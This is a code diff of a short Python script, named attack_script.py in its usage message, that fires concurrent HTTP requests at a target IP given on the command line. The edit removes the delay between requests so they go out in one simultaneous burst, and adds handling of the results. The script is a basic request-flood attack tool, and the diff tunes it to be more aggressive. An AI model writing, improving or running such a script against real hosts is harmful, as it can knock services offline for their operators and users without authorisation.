@@ -1,7 +1,7 @@
 import sys
 import time
 import requests
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 if len(sys.argv) != 2:
     print("Usage: python attack_script.py <target_ip>")
@@ -17,14 +17,21 @@ def make_request(url):
     except requests.exceptions.RequestException as e:
         print(f"Error requesting {url}: {e}")
 
-
-num_requests = 100  # Puedes ajustar este número según sea necesario
-
+num_requests = 50
 
 with ThreadPoolExecutor(max_workers=num_requests) as executor:
+    futures = []
     for _ in range(num_requests):
-        executor.submit(make_request, url)
-        time.sleep(0.2)  # Añadir un pequeño retraso entre las solicitudes
+        future = executor.submit(make_request, url)
+        futures.append(future)
+
+    
+    for future in as_completed(futures):
+        try:
+            future.result()
+        except Exception as e:
+            print(f"Exception during request: {e}")
 
 
-time.sleep(5)  # Ajusta el tiempo según sea necesario
+time.sleep(5) 
+
